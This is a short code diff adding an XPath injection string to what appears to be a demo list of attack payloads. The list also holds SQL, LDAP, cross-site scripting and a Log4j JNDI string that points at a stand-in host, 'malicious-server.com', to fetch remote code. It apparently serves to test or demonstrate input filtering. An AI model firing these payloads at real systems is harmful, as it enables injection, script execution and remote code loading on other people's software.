@@ -294,6 +294,7 @@ content %}
       {"attack": "SQL Injection 2", "payload": "' or (select (select 'abc')) = 'abc"},
       {"attack": "LDAP Injection 1", "payload": "\"Information)(security_level=*))(&(directory=documents\""},
       {"attack": "LDAP Injection 2", "payload": "\"value)(injected_filter\""},
+      {"attack": "XPath Injection", "payload": "lol' or 1=1 or 'a'='a"},
       {"attack": "Cross-Site Scripting 1", "payload": "<scr" + "ipt>confirm(\"Would you like some XSS?\")</scr" + "ipt>",},
       {"attack": "Cross-Site Scripting 2", "payload": "<i" + "mg> src=\"/\" =_=\" title=\"onerror='prompt(\"XSS\")'\">",},
       {"attack": "Log4j", "payload": "${jndi:ldap://malicious-server.com/exploit}",}
